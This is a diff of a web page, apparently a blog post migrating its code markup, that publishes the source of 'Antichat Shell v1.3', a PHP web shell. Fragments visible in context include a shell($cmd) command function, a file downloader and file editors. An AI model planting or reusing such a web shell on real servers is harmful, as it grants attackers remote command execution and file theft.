@@ -15,7 +15,7 @@ Antichat Shell v1.3 by Grinay
 
 ### Antichat Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 
 session_start();
 set_time_limit(9999999);
@@ -51,9 +51,9 @@ header('Content-Disposition: attachment; filename="'.$file.'"');
 readfile($file);
 }
 //end downloader
-?&gt;
+?>
 
-&lt;? echo $header;?&gt; 
+<? echo $header;?> 
 &lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;
 &lt;table&gt;&lt;tr&gt;
 &lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();"&gt;| Shell &lt;/a&gt;&lt;/td&gt;
@@ -69,7 +69,7 @@ readfile($file);
 &lt;table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
 &lt;tr&gt;&lt;td width="100%" valign="top"&gt;
 
-&lt;?
+<?
 
 //shell
 function shell($cmd){
@@ -192,10 +192,10 @@ echo "&lt;form method=\"POST\"&gt;
 &lt;input type=\"submit\" name=\"save\" value=\"save\"&gt;&lt;input type=\"reset\" value=\"reset\"&gt;&lt;/form&gt;";
 }
 //end editors
-?&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="http://antichat.ru"&gt;COPYRIGHT BY ANTICHAT.RU &lt;?php echo $version;?&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt;
-&lt;? echo $footer;?&gt;
-</pre>
+?>
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="http://antichat.ru"&gt;COPYRIGHT BY ANTICHAT.RU <?php echo $version;?>&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt;
+<? echo $footer;?>
+{% endhighlight %}
 
 ### Antichat shell version 1.3 screenshot<figure id="attachment_437" style="width: 808px;" class="wp-caption aligncenter">
 
